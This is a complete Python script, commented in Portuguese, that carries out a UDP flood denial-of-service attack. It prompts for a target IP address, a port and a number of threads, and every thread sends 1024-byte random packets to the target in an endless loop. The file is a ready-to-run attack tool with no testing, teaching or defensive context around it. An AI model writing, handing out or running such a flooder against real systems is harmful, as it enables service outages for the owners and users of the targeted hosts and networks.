import socket
import os  # Adicionado para gerar dados aleatórios
import random
import threading

def udp_flood(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = os.urandom(1024)  # Gera dados aleatórios de 1024 bytes
    while True:
        client.sendto(message, (target_ip, target_port))
        print(f"Pacote UDP enviado para {target_ip}:{target_port}")

def start_udp_flood(ip, port, threads):
    for _ in range(threads):
        thread = threading.Thread(target=udp_flood, args=(ip, port))
        thread.start()

if __name__ == "__main__":
    target_ip = input("Digite o IP alvo: ")  # IP do alvo
    target_port = int(input("Digite a porta: "))  # Converte a porta para um inteiro
    num_threads = int(input("Digite o número de threads: "))
    start_udp_flood(target_ip, target_port, num_threads)
